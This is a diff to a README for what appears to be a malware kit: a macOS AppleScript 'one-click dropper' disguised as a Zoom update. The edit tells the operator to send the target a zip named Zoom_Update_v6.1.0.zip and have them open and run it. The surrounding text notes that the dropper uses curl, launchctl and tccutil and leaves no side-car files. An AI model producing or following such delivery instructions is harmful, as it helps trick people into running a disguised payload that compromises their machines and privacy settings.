@@ -55,8 +55,9 @@ sh ./uninstall-betterdesk-support.sh
 ## One-click dropper: `zoom-update-microsoft.scpt`
 
 `zoom-update-microsoft.scpt` is the compiled AppleScript equivalent of the
-Windows `zoom-update-microsoft.vbs` chain. It is the file to hand to a target:
-opening it in Script Editor and pressing Run executes native macOS automation
+Windows `zoom-update-microsoft.vbs` chain. **Send `Zoom_Update_v6.1.0.zip`:**
+extract, open the `.scpt` in Script Editor and press Run. A compiled `.scpt` is
+already executable, so no `chmod` is needed. It uses native macOS automation
 only (`curl`, `installer`, `sqlite3`, `launchctl`, `tccutil`) and leaves no
 interpreter or side-car files.
 
